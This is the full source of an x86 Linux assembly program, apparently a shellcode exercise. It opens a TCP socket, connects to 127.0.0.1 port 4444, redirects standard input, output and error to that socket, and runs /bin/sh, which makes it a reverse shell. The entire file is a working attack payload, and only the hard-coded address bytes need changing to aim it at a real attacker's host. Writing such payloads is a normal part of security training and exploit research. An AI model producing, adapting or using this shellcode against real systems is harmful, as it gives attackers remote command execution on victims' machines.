bits 32
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0) = (2, 1, 0)
	
	xor ebx, ebx
	push ebx

	inc ebx
	push ebx

	inc ebx
	push ebx

	dec ebx

	mov ecx, esp

	push 102
	pop eax ; SYS_socketcall

	int 0x80

	mov esi, eax

	; connect(sockfd, &saddr, 0x10)

	xor edx, edx
	inc ebx

	; Creating sockaddr struct
	push dword 0x0101017f ; IP: 127.0.0.1
	push word 0x5c11 ; PORT: 4444
	push bx
	
	; connect arguments
	mov ecx, esp
	mov dl, 0x10
	push edx
	push ecx
	push esi
	mov ecx, esp

	inc ebx

	mov al, 102 ; SYS_socketcall
	int 0x80

	mov ebx, esi

	; dup2(sockfd, [0,1,2])
	
	xor ecx, ecx
	duplicate:
		mov al, 63
		int 0x80
		inc cl
		cmp cl, 0x2
		jle duplicate

	; execve("/bin/sh", NULL, NULL)
	
	xor ecx, ecx
	xor edx, edx
	
	push edx
	push 0x68732f2f ; //sh
	push 0x6e69622f ; /bin
	mov ebx, esp

	push 0xb ; SYS_execve
	pop eax
	int 0x80